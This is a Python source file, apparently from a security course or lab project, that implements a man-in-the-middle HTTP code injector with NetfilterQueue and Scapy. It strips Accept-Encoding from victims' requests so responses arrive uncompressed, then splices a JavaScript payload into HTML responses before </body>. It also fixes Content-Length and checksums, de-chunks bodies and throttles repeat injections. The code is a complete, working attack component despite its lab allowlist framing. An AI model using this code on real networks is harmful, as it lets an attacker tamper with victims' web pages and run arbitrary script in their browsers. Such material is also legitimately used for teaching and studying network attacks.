"""Packet handler for HTTP traffic interception and modification.

This module implements the same attack primitive as the single-file
``demo_code_injector.py`` / course reference script, split into a
testable class:

- Requests (client -> server, TCP dport 80): strip ``Accept-Encoding`` so
  the server sends plaintext instead of gzip, since the injection step
  below only knows how to edit uncompressed HTML.
- Responses (server -> client, TCP sport 80): inject a payload before
  ``</body>`` and recompute ``Content-Length`` so the browser doesn't
  truncate or choke on the now-larger body.

Both directions are matched against a target IP allowlist (populated
from ``TARGETS.txt`` via ``SafetyConfig``) so nothing outside the
authorized lab hosts is ever touched.
"""

import re
from dataclasses import dataclass
from datetime import datetime
from typing import TYPE_CHECKING, Dict, Set, Tuple

from scapy.all import IP, TCP, Raw

if TYPE_CHECKING:
    from netfilterqueue import Packet
else:
    try:
        from netfilterqueue import Packet
    except ImportError:
        Packet = object  # type: ignore[misc, assignment]

from ..config.settings import InjectionConfig
from ..injectors.base import BaseInjector

# HTTP headers and status lines are ASCII/Latin-1 by spec (RFC 7230), but an
# HTML *body* can legally contain arbitrary bytes in another charset (e.g.
# ISO-8859-1 pages, or binary-ish content someone mislabeled as text/html).
# Decoding with 'utf-8' + errors='ignore' would silently drop any byte that
# isn't valid UTF-8, corrupting the body and desyncing our recomputed
# Content-Length from what we actually put on the wire. 'latin-1' is a
# byte-transparent codec (every one of the 256 byte values round-trips to
# the same code point and back), so decode -> str-munge -> encode never
# loses or rewrites bytes we didn't intend to touch.
_HTTP_CODEC = "latin-1"


@dataclass
class InjectionStats:
    """Statistics for injection operations."""

    packets_processed: int = 0
    http_requests_seen: int = 0
    http_responses_seen: int = 0
    accept_encoding_stripped: int = 0
    injection_attempts: int = 0
    successful_injections: int = 0
    skipped_responses: int = 0
    content_length_errors: int = 0
    chunked_responses: int = 0


class PacketHandler:
    """
    Handler for processing and modifying HTTP packets.

    This class implements the core MITM logic for intercepting HTTP traffic:
    stripping Accept-Encoding on the way out, and injecting JavaScript into
    HTML responses on the way back.
    """

    def __init__(
        self,
        injector: BaseInjector,
        config: InjectionConfig,
        targets: Set[str],
        verbose: bool = False,
    ):
        """
        Initialize the packet handler.

        Args:
            injector: The injection strategy to use
            config: Injection configuration
            targets: Set of allowed target IP addresses
            verbose: Enable verbose logging
        """
        self.injector = injector
        self.config = config
        self.targets = targets
        self.verbose = verbose

        self.stats = InjectionStats()

        # Session tracking for throttling
        self.session_injection_times: Dict[str, datetime] = {}

        # Domain/path targeting
        self.domain_whitelist = set(config.domain_whitelist)
        self.path_whitelist = set(config.path_whitelist)
        self.domain_blacklist = set(config.domain_blacklist)
        self.path_blacklist = set(config.path_blacklist)

    def handle_packet(self, packet: Packet) -> None:
        """
        Process a single packet from the NFQUEUE.

        Every branch below must eventually call packet.accept() (or
        packet.drop(), which we never do here) -- NFQUEUE blocks the real
        kernel packet flow until userspace makes a verdict, so a codepath
        that raises or returns without a verdict would stall the victim's
        connection rather than just fail to inject.

        Args:
            packet: NetfilterQueue packet object
        """
        self.stats.packets_processed += 1

        try:
            # Parse the raw IP datagram NFQUEUE handed us back into a Scapy
            # packet so we can read TCP ports/flags and the Raw payload.
            payload = packet.get_payload()
            pkt = IP(payload)

            # Only packets carrying an actual TCP payload can be HTTP.
            if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
                packet.accept()
                return

            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            tcp = pkt[TCP]

            # Request direction: victim (target) -> web server, dport 80.
            # We only need to strip Accept-Encoding here; the target's
            # source IP is what we match against the allowlist.
            if tcp.dport == 80 and src_ip in self.targets:
                self._process_http_request(packet, pkt)
                return

            # Response direction: web server -> victim (target), sport 80.
            # The target is now the *destination*, not the source -- the
            # packet's source is the remote web server, which is never in
            # our lab-only targets file.
            if tcp.sport == 80 and dst_ip in self.targets:
                self._process_http_response(packet, pkt, dst_ip)
                return

            packet.accept()

        except Exception as e:
            if self.verbose:
                print(f"Error processing packet: {e}")
            packet.accept()

    def _process_http_request(self, packet: Packet, pkt: IP) -> None:
        """
        Strip Accept-Encoding from an outbound HTTP request.

        The server picks its response encoding based on what the client
        claims to accept. If we don't disable compression here, the
        response body arrives gzipped and our plain string search for
        ``</body>`` in _process_http_response would never match compressed
        bytes.

        Args:
            packet: NetfilterQueue packet object
            pkt: Scapy IP packet (already confirmed to have a TCP+Raw layer)
        """
        try:
            if not self.config.strip_accept_encoding:
                packet.accept()
                return

            load = bytes(pkt[Raw].load)

            # Anything other than a genuine HTTP request line isn't worth
            # touching (avoids mangling non-HTTP traffic that happens to
            # ride on port 80).
            if not load.startswith((b"GET ", b"POST ", b"HEAD ", b"PUT ", b"DELETE ")):
                packet.accept()
                return

            self.stats.http_requests_seen += 1

            new_load = re.sub(rb"Accept-Encoding:.*?\r\n", b"", load)

            if new_load == load:
                packet.accept()
                return

            self.stats.accept_encoding_stripped += 1
            pkt[Raw].load = new_load

            # Changing the payload size invalidates the IP total-length
            # field and both checksums. Deleting them tells Scapy to
            # recompute on serialization instead of shipping stale values
            # that would make the kernel/NIC drop the packet as corrupt.
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum

            packet.set_payload(bytes(pkt))

            if self.verbose:
                print(f"[+] Stripped Accept-Encoding from request to {pkt[IP].dst}")

            packet.accept()

        except Exception as e:
            if self.verbose:
                print(f"Error processing HTTP request: {e}")
            packet.accept()

    def _process_http_response(self, packet: Packet, pkt: IP, target_ip: str) -> None:
        """
        Process an HTTP response packet.

        Args:
            packet: NetfilterQueue packet object
            pkt: Scapy IP packet
            target_ip: The victim IP this response is heading to (the
                packet's *destination*, not its source)
        """
        try:
            # Byte-safe decode -- see _HTTP_CODEC comment above.
            http_data = bytes(pkt[Raw].load).decode(_HTTP_CODEC)

            # A TCP segment might be a mid-stream continuation, not the
            # start of a response; only a real status line has this shape.
            if not http_data.startswith("HTTP/"):
                packet.accept()
                return

            self.stats.http_responses_seen += 1

            # Parse HTTP status line, headers and body
            status_line, headers, body = self._parse_http_response(http_data)

            # Check Content-Type -- never touch non-HTML bodies. A naive
            # `.replace("</body>", ...)` on e.g. a JSON or image response
            # that merely happens to contain that byte sequence would
            # corrupt it, so this guard runs before any mutation.
            content_type = headers.get("Content-Type", "")
            if self.config.only_text_html and "text/html" not in content_type:
                self.stats.skipped_responses += 1
                packet.accept()
                return

            # Check domain/path targeting rules
            if not self._check_targeting_rules(headers, body):
                self.stats.skipped_responses += 1
                packet.accept()
                return

            # Check throttling
            session_id = self._get_session_id(headers, target_ip)
            if self._is_throttled(session_id):
                self.stats.skipped_responses += 1
                packet.accept()
                return

            # Check for chunked encoding
            transfer_encoding = headers.get("Transfer-Encoding", "").lower()
            is_chunked = "chunked" in transfer_encoding

            if is_chunked:
                self.stats.chunked_responses += 1
                if self.config.chunked_handling == "dechunk":
                    # De-chunk, inject, and convert to Content-Length
                    body = self._dechunk_body(body)
                    del headers["Transfer-Encoding"]
                elif self.config.chunked_handling == "passthrough":
                    # Skip chunked responses
                    self.stats.skipped_responses += 1
                    packet.accept()
                    return
                else:
                    # Error on chunked
                    if self.verbose:
                        print(f"Skipping chunked response from {target_ip}")
                    self.stats.skipped_responses += 1
                    packet.accept()
                    return

            # Check if injection should occur
            if not self.injector.should_inject(body):
                packet.accept()
                return

            self.stats.injection_attempts += 1

            # Perform injection
            modified_body = self._inject_payload(body)

            if modified_body == body:
                # No injection occurred (injection point missing)
                packet.accept()
                return

            self.stats.successful_injections += 1

            # Update Content-Length to match the now-larger body. Browsers
            # trust this header over the actual bytes received; leaving it
            # stale would truncate our own injected payload or hang the
            # connection waiting for bytes that will never arrive.
            headers["Content-Length"] = str(len(modified_body.encode(_HTTP_CODEC)))

            # Rebuild HTTP response, preserving the original status line
            # (e.g. "HTTP/1.1 304 Not Modified") instead of assuming 200.
            modified_http = self._rebuild_http_response(status_line, headers, modified_body)

            # Update packet payload
            pkt[Raw].load = modified_http.encode(_HTTP_CODEC)

            # See _process_http_request for why these must be deleted.
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum

            packet.set_payload(bytes(pkt))

            if self.verbose:
                print(f"[+] Injected payload into response for {target_ip}")

            packet.accept()

            # Update session tracking
            self.session_injection_times[session_id] = datetime.now()

        except Exception as e:
            if self.verbose:
                print(f"Error processing HTTP response: {e}")
            self.stats.content_length_errors += 1
            packet.accept()

    def _parse_http_response(self, http_data: str) -> Tuple[str, Dict[str, str], str]:
        """
        Parse HTTP response into its status line, headers and body.

        Args:
            http_data: Raw HTTP response string

        Returns:
            Tuple of (status line, headers dict, body string)
        """
        lines = http_data.split("\r\n")
        status_line = lines[0] if lines else "HTTP/1.1 200 OK"

        headers: Dict[str, str] = {}
        body_start = len(lines)

        for i, line in enumerate(lines[1:], 1):
            if not line:
                body_start = i + 1
                break

            if ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()

        body = "\r\n".join(lines[body_start:])

        return status_line, headers, body

    def _rebuild_http_response(self, status_line: str, headers: Dict[str, str], body: str) -> str:
        """
        Rebuild HTTP response from its status line, headers and body.

        Reusing the original status line (rather than hardcoding
        "HTTP/1.1 200 OK") keeps redirects, 304s, 404s etc. intact --
        we're only supposed to be modifying the body and Content-Length.

        Args:
            status_line: Original HTTP status line
            headers: HTTP headers dictionary
            body: HTTP body string

        Returns:
            Complete HTTP response string
        """
        header_lines = [f"{key}: {value}" for key, value in headers.items()]
        return status_line + "\r\n" + "\r\n".join(header_lines) + "\r\n\r\n" + body

    def _inject_payload(self, body: str) -> str:
        """
        Inject the JavaScript payload into the HTML body.

        Args:
            body: HTML body string

        Returns:
            Modified HTML body with injected payload
        """
        payload = self.injector.get_payload()
        injection_point = self.injector.get_injection_point()

        if injection_point not in body:
            return body

        # Inject before the closing body tag
        return body.replace(injection_point, payload + injection_point)

    def _dechunk_body(self, chunked_body: str) -> str:
        """De-chunk a chunked HTTP response body.

        Walks the raw string by offset rather than splitting on ``\\r\\n``
        first, because chunk *data* is allowed to contain ``\\r\\n`` (e.g.
        HTML line-breaks).  Each chunk is:

            <hex-size>\\r\\n
            <exactly *size* characters of data>\\r\\n

        Terminated by a zero-length chunk: ``0\\r\\n\\r\\n``.

        Args:
            chunked_body: Chunked transfer encoding body

        Returns:
            De-chunked body
        """
        decoded: list[str] = []
        pos = 0
        body = chunked_body

        while pos < len(body):
            # Find the end of the chunk-size line.
            crlf = body.find("\r\n", pos)
            if crlf == -1:
                break  # malformed — no more CRLF

            size_str = body[pos:crlf].strip()
            if not size_str:
                pos = crlf + 2
                continue

            try:
                chunk_size = int(size_str, 16)
            except ValueError:
                break  # not a valid hex size — stop

            if chunk_size == 0:
                break  # terminal chunk

            data_start = crlf + 2
            data_end = data_start + chunk_size
            if data_end > len(body):
                # Truncated chunk — take what we have.
                decoded.append(body[data_start:])
                break

            decoded.append(body[data_start:data_end])

            # Skip past the trailing CRLF after the chunk data.
            pos = data_end + 2

        return "".join(decoded)

    def _check_targeting_rules(self, headers: Dict[str, str], body: str) -> bool:
        """
        Check domain and path targeting rules.

        Args:
            headers: HTTP headers
            body: HTTP body

        Returns:
            True if targeting rules allow injection
        """
        host = headers.get("Host", "")

        if self.domain_whitelist and not any(domain in host for domain in self.domain_whitelist):
            return False

        if self.domain_blacklist and any(domain in host for domain in self.domain_blacklist):
            return False

        if self.path_whitelist and not any(path in body for path in self.path_whitelist):
            return False

        # Check path blacklist
        return not (self.path_blacklist and any(path in body for path in self.path_blacklist))

    def _get_session_id(self, headers: Dict[str, str], target_ip: str) -> str:
        """
        Generate a session ID for throttling.

        Args:
            headers: HTTP headers
            target_ip: Victim IP address

        Returns:
            Session identifier string
        """
        # Use IP and User-Agent for session identification
        user_agent = headers.get("User-Agent", "")
        return f"{target_ip}:{hash(user_agent)}"

    def _is_throttled(self, session_id: str) -> bool:
        """
        Check if a session is throttled.

        Args:
            session_id: Session identifier

        Returns:
            True if throttled, False otherwise
        """
        if not self.config.throttle_per_target:
            return False

        if session_id not in self.session_injection_times:
            return False

        last_injection = self.session_injection_times[session_id]
        elapsed = (datetime.now() - last_injection).total_seconds()

        return elapsed < self.config.reinjection_delay

    def get_stats(self) -> InjectionStats:
        """
        Get current injection statistics.

        Returns:
            InjectionStats object with current statistics
        """
        return self.stats

    def reset_stats(self) -> None:
        """Reset injection statistics."""
        self.stats = InjectionStats()
